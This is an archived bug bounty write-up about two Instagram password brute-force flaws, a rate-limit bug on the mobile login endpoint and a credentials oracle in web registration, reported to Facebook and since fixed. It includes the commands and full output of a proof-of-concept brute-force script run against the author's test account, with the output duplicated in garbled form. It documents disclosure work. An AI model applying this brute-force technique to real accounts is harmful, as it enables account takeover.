---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-05-19_instabrute-two-ways-to-brute-force-instagram-account-credentials.md
original_filename: 2016-05-19_instabrute-two-ways-to-brute-force-instagram-account-credentials.md
title: 'InstaBrute: Two Ways to Brute-force Instagram Account Credentials'
category: documents
detected_topics:
- rate-limit
- mfa
- mobile-security
- idor
- command-injection
- otp
tags:
- imported
- documents
- rate-limit
- mfa
- mobile-security
- idor
- command-injection
- otp
language: en
raw_sha256: 3a8f56c06efb84fa2494d21a7700f6d4d7c0e8dfdb302cae2973bba66e2f91ba
text_sha256: 15eeaebc7c90a5b662343a3075c3e8db10868c781c5c1f297925c07d475c49d2
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: true
---

# InstaBrute: Two Ways to Brute-force Instagram Account Credentials

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-05-19_instabrute-two-ways-to-brute-force-instagram-account-credentials.md
- Source Type: markdown
- Detected Topics: rate-limit, mfa, mobile-security, idor, command-injection, otp
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: True
- Raw SHA256: `3a8f56c06efb84fa2494d21a7700f6d4d7c0e8dfdb302cae2973bba66e2f91ba`
- Text SHA256: `15eeaebc7c90a5b662343a3075c3e8db10868c781c5c1f297925c07d475c49d2`


## Content

---
title: "InstaBrute: Two Ways to Brute-force Instagram Account Credentials"
page_title: "InstaBrute: Two Ways to Brute-force Instagram Account Credentials – Arne Swinnen"
url: "https://www.arneswinnen.net/2016/05/instabrute-two-ways-to-brute-force-instagram-account-credentials/"
final_url: "https://www.arneswinnen.net/2016/05/instabrute-two-ways-to-brute-force-instagram-account-credentials/"
authors: ["Arne Swinnen (@ArneSwinnen)"]
programs: ["Meta / Facebook"]
bugs: ["Bruteforce", "Username enumeration"]
bounty: "5,000"
publication_date: "2016-05-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6291
---

[10](https://www.arneswinnen.net/2016/05/instabrute-two-ways-to-brute-force-instagram-account-credentials/#comments)

# InstaBrute: Two Ways to Brute-force Instagram Account Credentials

Posted on [May 19, 2016](https://www.arneswinnen.net/2016/05/instabrute-two-ways-to-brute-force-instagram-account-credentials/ "9:22 pm") by [Arne Swinnen](https://www.arneswinnen.net/author/swinnenarne/ "View all posts by Arne Swinnen")

**TL;DR:** Instagram contained two distinct vulnerabilities that allowed an attacker to brute-force passwords of user accounts. Combined with user enumeration, a weak password policy, no 2FA nor [other mitigating security controls](https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks), this could have allowed an attacker to compromise many accounts without any user interaction, including high-profile ones. Facebook fixed both issues and awarded a combined bounty of $5.000.

# Introduction

Authentication brute-force vulnerabilities are very serious issues for any web application. Users are known to [pick weak passwords and reuse them](https://www.leakedsource.com/blog/linkedin) and [many](https://github.com/danielmiessler/SecLists/tree/master/Passwords) [dictionaries](https://wiki.skullsecurity.org/Passwords) with millions of human-chosen passwords are publicly available to attackers to easily mount successful attacks. However, there are some additional arguments that make brute-force particularly effective against Instagram:

  * **User Enumeration** : Instagram usernames are public & enumerable via [incremental](https://i.instagram.com/api/v1/users/3/info/) [userIDs](https://i.instagram.com/api/v1/users/4/info/).
  * **Weak Password Policy** : At the time of submission, the Instagram password policy only enforced a minimum length of 6 characters, allowing choices such as “123456” and “password”.
  * **Two-Factor Authentication** : 2FA has only been [introduced in February 2016](http://techcrunch.com/2016/02/16/instagram-two-factor/), and is still not rolled out globally.
  * **Account Lockout Policy:** No account lockout policy is currently in place, nor any [other mitigating security controls](https://www.owasp.org/index.php/Blocking_Brute_Force_Attacks).

Therefore, exploitation of these issues could have resulted in the compromise of millions of the 400+ million active Instagram accounts – especially those with predictable passwords. Of course, targeted attacks against high-profile (Celebrity) accounts could have been very effective as well (cf. [Apple’s Celebgate](http://www.dailydot.com/technology/apple-icloud-brute-force-attack-march/)).

# Issue #1: Implementation Bug in Mobile Authentication Brute-force Protection

**Out of Scope:** In order to identify the Mobile Authentication endpoint communication in an intercepting proxy, SSL Pinning had to be bypassed in the Instagram for Android application. Additionally, in order to modify & attack this endpoint communication, a key had to be phished from the Android application, which is used to generate a HMACSHA256 signature over the POST parameters of every outgoing request. A Burp Plugin was written that transparently hotpatches the signature for outgoing requests generated, such as those generated by the Burp Intruder module – see below. More details can be found in [this previous blogpost](https://www.arneswinnen.net/2016/02/the-tales-of-a-bug-bounty-hunter-10-interesting-vulnerabilities-in-instagram/).

The Instagram for Android application used the endpoint at https://i.instagram.com/api/v1/accounts/login/ to perform authentication. A simple brute-force attack against this mobile authentication endpoint with Burp Intruder revealed that approximately 1000 reliable guesses could be made from one unique IP address, after which the response changed to “username not found”, although the user obviously still existed (Rate limiting):

[![InstaBruteIssue1Screenshot1](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot1.png)](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot1.png)

However, only the next consecutive 1000 guesses resulted in the “username not found” response error message. From the 2000th consecutive guess onward, a reliable response (password correct/incorrect) was followed by an unreliable one (user not found):

[![InstaBruteIssue1Screenshot2](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot2.png)](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot2.png)

This allowed a reliable brute-force attack, since an attacker could reason on the reliable response messages and simply replay the unreliable ones until a reliable answer was received. The only limitation of this attack was that on average, 2 authentication requests had to be made for one reliable password guess attempt. A quick & dirty python script with basic threading support “InstaBrutal.py” was made to prove this. The output of a brute-force attack of [10000 popular passwords](https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k_most_common.txt) against my Instagram test account “bruteforceme” with password “perfectcrime” can be seen here:

InstaBrutal.py 10k brute-force against Instagram user

Shell

# tail -f 10k_most_common.txt hoes howie hevnm4 hugohugo epson evangeli eeeee1 eyphed perfectcrime # python instabrutal.py [INFO] Usage: python instabrutal.py <INSTAGRAM_USERNAME> <DICTIONARY_FILENAME> <THREADS> [DEBUG] # python instabrutal.py bruteforceme 10k_most_common.txt 50 [INFO] Creating 50 worker threads... [INFO] Total # passwords: 10001 [INFO] Total # threads: 50 147.20 pw/s [=] 7% (736/10001) (Good:686 Bad:0 Error:0) 105.00 pw/s [==] 10% (1050/10001) (Good:1000 Bad:272 Error:0) 70.00 pw/s [==] 10% (1050/10001) (Good:1000 Bad:706 Error:0) 55.00 pw/s [==] 10% (1100/10001) (Good:1050 Bad:1028 Error:0) 50.84 pw/s [==] 12% (1271/10001) (Good:1221 Bad:1218 Error:0) 50.60 pw/s [===] 15% (1518/10001) (Good:1468 Bad:1453 Error:0) 49.94 pw/s [===] 17% (1748/10001) (Good:1698 Bad:1696 Error:0) 49.50 pw/s [===] 19% (1980/10001) (Good:1930 Bad:1913 Error:0) 48.56 pw/s [====] 21% (2185/10001) (Good:2135 Bad:2132 Error:0) 48.18 pw/s [====] 24% (2409/10001) (Good:2359 Bad:2353 Error:0) 48.20 pw/s [=====] 26% (2651/10001) (Good:2601 Bad:2593 Error:0) 48.02 pw/s [=====] 28% (2881/10001) (Good:2831 Bad:2825 Error:0) 46.57 pw/s [======] 30% (3027/10001) (Good:2977 Bad:2973 Error:0) 46.96 pw/s [======] 32% (3287/10001) (Good:3237 Bad:3234 Error:0) 46.72 pw/s [=======] 35% (3504/10001) (Good:3466 Bad:3427 Error:0) 46.38 pw/s [=======] 37% (3710/10001) (Good:3660 Bad:3658 Error:0) 46.61 pw/s [=======] 39% (3962/10001) (Good:3912 Bad:3910 Error:0) 46.58 pw/s [========] 41% (4192/10001) (Good:4142 Bad:4130 Error:0) 45.88 pw/s [========] 43% (4359/10001) (Good:4309 Bad:4303 Error:0) 46.25 pw/s [=========] 46% (4625/10001) (Good:4575 Bad:4573 Error:0) 46.47 pw/s [=========] 48% (4879/10001) (Good:4829 Bad:4823 Error:0) 45.84 pw/s [==========] 50% (5042/10001) (Good:4992 Bad:4990 Error:0) 45.95 pw/s [==========] 52% (5284/10001) (Good:5234 Bad:5229 Error:0) 45.93 pw/s [===========] 55% (5512/10001) (Good:5462 Bad:5455 Error:0) 45.97 pw/s [===========] 57% (5746/10001) (Good:5696 Bad:5693 Error:0) 45.55 pw/s [===========] 59% (5921/10001) (Good:5871 Bad:5870 Error:0) 45.70 pw/s [============] 61% (6169/10001) (Good:6119 Bad:6115 Error:0) 45.84 pw/s [============] 64% (6418/10001) (Good:6368 Bad:6355 Error:0) 45.86 pw/s [=============] 66% (6649/10001) (Good:6599 Bad:6594 Error:0) 45.81 pw/s [=============] 68% (6872/10001) (Good:6822 Bad:6812 Error:0) 45.32 pw/s [==============] 70% (7025/10001) (Good:6975 Bad:6973 Error:0) 45.63 pw/s [==============] 73% (7301/10001) (Good:7251 Bad:7247 Error:0) 45.63 pw/s [===============] 75% (7529/10001) (Good:7479 Bad:7463 Error:0) 45.56 pw/s [===============] 77% (7746/10001) (Good:7696 Bad:7680 Error:0) 45.17 pw/s [===============] 79% (7905/10001) (Good:7855 Bad:7839 Error:0) 45.54 pw/s [================] 81% (8197/10001) (Good:8147 Bad:8134 Error:0) 45.36 pw/s [================] 83% (8392/10001) (Good:8342 Bad:8342 Error:0) 45.26 pw/s [=================] 85% (8599/10001) (Good:8549 Bad:8547 Error:0) 45.43 pw/s [=================] 88% (8858/10001) (Good:8807 Bad:8801 Error:0) 45.49 pw/s [==================] 90% (9098/10001) (Good:9047 Bad:9037 Error:0) 45.31 pw/s [==================] 92% (9289/10001) (Good:9238 Bad:9224 Error:0) 45.24 pw/s [===================] 95% (9501/10001) (Good:9450 Bad:9441 Error:0) 45.41 pw/s [===================] 97% (9763/10001) (Good:9712 Bad:9711 Error:0) 45.37 pw/s [===================] 99% (9982/10001) (Good:9931 Bad:9924 Error:0) [SUCCESS] Found the right password=***REDACTED*** 44.45 pw/s [====================] 100% (10001/10001) (Good:9999 Bad:9992 Error:0) [End] Total time: 227 seconds

1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465 | # tail -f 10k_most_common.txt hoeshowiehevnm4hugohugoepsonevangelieeeee1eyphedperfectcrime # python instabrutal.py [INFO] Usage: python instabrutal.py <INSTAGRAM_USERNAME> <DICTIONARY_FILENAME> <THREADS> [DEBUG] # python instabrutal.py bruteforceme 10k_most_common.txt 50[INFO] Creating 50 worker threads...[INFO] Total # passwords: 10001[INFO] Total # threads: 50147.20 pw/s [=] 7% (736/10001) (Good:686 Bad:0 Error:0)105.00 pw/s [==] 10% (1050/10001) (Good:1000 Bad:272 Error:0)70.00 pw/s [==] 10% (1050/10001) (Good:1000 Bad:706 Error:0)55.00 pw/s [==] 10% (1100/10001) (Good:1050 Bad:1028 Error:0)50.84 pw/s [==] 12% (1271/10001) (Good:1221 Bad:1218 Error:0)50.60 pw/s [===] 15% (1518/10001) (Good:1468 Bad:1453 Error:0)49.94 pw/s [===] 17% (1748/10001) (Good:1698 Bad:1696 Error:0)49.50 pw/s [===] 19% (1980/10001) (Good:1930 Bad:1913 Error:0)48.56 pw/s [====] 21% (2185/10001) (Good:2135 Bad:2132 Error:0)48.18 pw/s [====] 24% (2409/10001) (Good:2359 Bad:2353 Error:0)48.20 pw/s [=====] 26% (2651/10001) (Good:2601 Bad:2593 Error:0)48.02 pw/s [=====] 28% (2881/10001) (Good:2831 Bad:2825 Error:0)46.57 pw/s [======] 30% (3027/10001) (Good:2977 Bad:2973 Error:0)46.96 pw/s [======] 32% (3287/10001) (Good:3237 Bad:3234 Error:0)46.72 pw/s [=======] 35% (3504/10001) (Good:3466 Bad:3427 Error:0)46.38 pw/s [=======] 37% (3710/10001) (Good:3660 Bad:3658 Error:0)46.61 pw/s [=======] 39% (3962/10001) (Good:3912 Bad:3910 Error:0)46.58 pw/s [========] 41% (4192/10001) (Good:4142 Bad:4130 Error:0)45.88 pw/s [========] 43% (4359/10001) (Good:4309 Bad:4303 Error:0)46.25 pw/s [=========] 46% (4625/10001) (Good:4575 Bad:4573 Error:0)46.47 pw/s [=========] 48% (4879/10001) (Good:4829 Bad:4823 Error:0)45.84 pw/s [==========] 50% (5042/10001) (Good:4992 Bad:4990 Error:0)45.95 pw/s [==========] 52% (5284/10001) (Good:5234 Bad:5229 Error:0)45.93 pw/s [===========] 55% (5512/10001) (Good:5462 Bad:5455 Error:0)45.97 pw/s [===========] 57% (5746/10001) (Good:5696 Bad:5693 Error:0)45.55 pw/s [===========] 59% (5921/10001) (Good:5871 Bad:5870 Error:0)45.70 pw/s [============] 61% (6169/10001) (Good:6119 Bad:6115 Error:0)45.84 pw/s [============] 64% (6418/10001) (Good:6368 Bad:6355 Error:0)45.86 pw/s [=============] 66% (6649/10001) (Good:6599 Bad:6594 Error:0)45.81 pw/s [=============] 68% (6872/10001) (Good:6822 Bad:6812 Error:0)45.32 pw/s [==============] 70% (7025/10001) (Good:6975 Bad:6973 Error:0)45.63 pw/s [==============] 73% (7301/10001) (Good:7251 Bad:7247 Error:0)45.63 pw/s [===============] 75% (7529/10001) (Good:7479 Bad:7463 Error:0)45.56 pw/s [===============] 77% (7746/10001) (Good:7696 Bad:7680 Error:0)45.17 pw/s [===============] 79% (7905/10001) (Good:7855 Bad:7839 Error:0)45.54 pw/s [================] 81% (8197/10001) (Good:8147 Bad:8134 Error:0)45.36 pw/s [================] 83% (8392/10001) (Good:8342 Bad:8342 Error:0)45.26 pw/s [=================] 85% (8599/10001) (Good:8549 Bad:8547 Error:0)45.43 pw/s [=================] 88% (8858/10001) (Good:8807 Bad:8801 Error:0)45.49 pw/s [==================] 90% (9098/10001) (Good:9047 Bad:9037 Error:0)45.31 pw/s [==================] 92% (9289/10001) (Good:9238 Bad:9224 Error:0)45.24 pw/s [===================] 95% (9501/10001) (Good:9450 Bad:9441 Error:0)45.41 pw/s [===================] 97% (9763/10001) (Good:9712 Bad:9711 Error:0)45.37 pw/s [===================] 99% (9982/10001) (Good:9931 Bad:9924 Error:0)[SUCCESS] Found the right password=***REDACTED*** pw/s [====================] 100% (10001/10001) (Good:9999 Bad:9992 Error:0)[End] Total time: 227 seconds  
---|---  
  
Notice that the first 1000 guesses were reliable (“good”) guesses, followed by 1000 unreliable ones (“bad”), which were ignored by the python script. Hereafter, the ratio remained closely around 50%. The numbers are slightly off due to lack of thread locks around the global variables storing them, as the purpose of the quick & dirty script was to simply prove the underlying vulnerability.

Although the script made 10001 password guesses for account “bruteforceme”, an attacker could simply login from any IP address, including the one that was used to mount the brute-force attack. This indicated a lack of additional security controls against account compromise, such as account lockout, IP address location-based fraud detection, …

[![InstaBruteIssue1Screenshot3](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot3.png)](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot3.png)

[![InstaBruteIssue1Screenshot4](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot4.png)](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue1Screenshot4.png)

# Issue #2: Credentials Oracle in Web Registration Endpoint

Since a couple of months, Instagram allows registration via its website as opposed to only via its mobile applications. Registering a test account “arneswinnen8168” with password “passwd” issued the following underlying request & response:

[![1. Web Registration](https://www.arneswinnen.net/wp-content/uploads/2016/02/1.-Web-Registration.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/1.-Web-Registration.png)

[![2. Web Registration Request](https://www.arneswinnen.net/wp-content/uploads/2016/02/2.-Web-Registration-Request.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/2.-Web-Registration-Request.png)

[![3. Web Registration Response](https://www.arneswinnen.net/wp-content/uploads/2016/02/3.-Web-Registration-Response.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/3.-Web-Registration-Response.png)

However, by simply replaying this exact request, a different response message was now encountered:[  
](https://www.arneswinnen.net/wp-content/uploads/2016/01/InstaBruteIssue2Screenshot4.png) [![4. Web Registration Replay](https://www.arneswinnen.net/wp-content/uploads/2016/02/4.-Web-Registration-Replay.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/4.-Web-Registration-Replay.png)

After removing all parameters in the request except “username” and “password”, the replay of a request with a correct password value and one of an incorrect password value highlights the credentials oracle:

[![5. Replay wrong password](https://www.arneswinnen.net/wp-content/uploads/2016/02/5.-Replay-wrong-password.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/5.-Replay-wrong-password.png)

[![6. Replay correct password](https://www.arneswinnen.net/wp-content/uploads/2016/02/6.-Replay-correct-password.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/6.-Replay-correct-password.png)

Finally, a burp intruder brute-force attack of 10001 passwords, with the 10001th entry being the correct password “passwd”, confirmed the trivial brute-force attack:

[![7. 10.000th wrong guess](https://www.arneswinnen.net/wp-content/uploads/2016/02/7.-10.000th-wrong-guess-1.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/7.-10.000th-wrong-guess-1.png)[  
](https://www.arneswinnen.net/wp-content/uploads/2016/02/7.-10.000th-wrong-guess-1.png) [![8. 10.001th correct guess](https://www.arneswinnen.net/wp-content/uploads/2016/02/8.-10.001th-correct-guess.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/8.-10.001th-correct-guess.png)

Logging in with the harvested credentials again worked, no account lockout or other security controls were triggered during the successful brute-force attack:

[![9. Login](https://www.arneswinnen.net/wp-content/uploads/2016/02/9.-Login.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/9.-Login.png)

[![10. Login successful](https://www.arneswinnen.net/wp-content/uploads/2016/02/10.-Login-successful.png)](https://www.arneswinnen.net/wp-content/uploads/2016/02/10.-Login-successful.png)

# Facebook’s Mitigations

  * Issue #1 was resolved by fixing the rate-limiting bug in the mobile authentication endpoint.
  * Issue #2 was resolved by introducing rate-limiting on the web registration endpoint.
  * The password policy was [slightly hardened](https://help.instagram.com/369001149843369), and extremely easy passwords such as “123456” and “password” are now not allowed anymore.

# Timeline

  * 28/12/2015: Submitted bug report for issue #1 to Facebook Bug Bounty, including PoC python script.
  * 08/02/2016: Submitted bug report for issue #2 to Facebook Bug Bounty.
  * 11/02/2016: Facebook confirmed that issue #2 is patched.  

  * 13/02/2016: Facebook confirmed that issue #1 was patched earlier as well and granted a combined bounty of $5.000.
  * 04/04/2016: Informed Facebook that fix for issue #2 is not effective.
  * 10/05/2016: Facebook reconfirmed new fix for issue #2.
  * 19/05/2016: New fix deemed working, public disclosure.

### [Arne Swinnen](https://www.arneswinnen.net/author/swinnenarne/ "All posts by Arne Swinnen")

![](https://secure.gravatar.com/avatar/85c6e3f06dfe5994e9c112f745d801f39266bc0c77c1deadbfed337f3aa5da49?s=70&d=mm&r=g)

[](https://www.twitter.com/ArneSwinnen)[](https://www.linkedin.com/in/arneswinnen)

Belgian. IT Security. Bug Bounty Hunter.
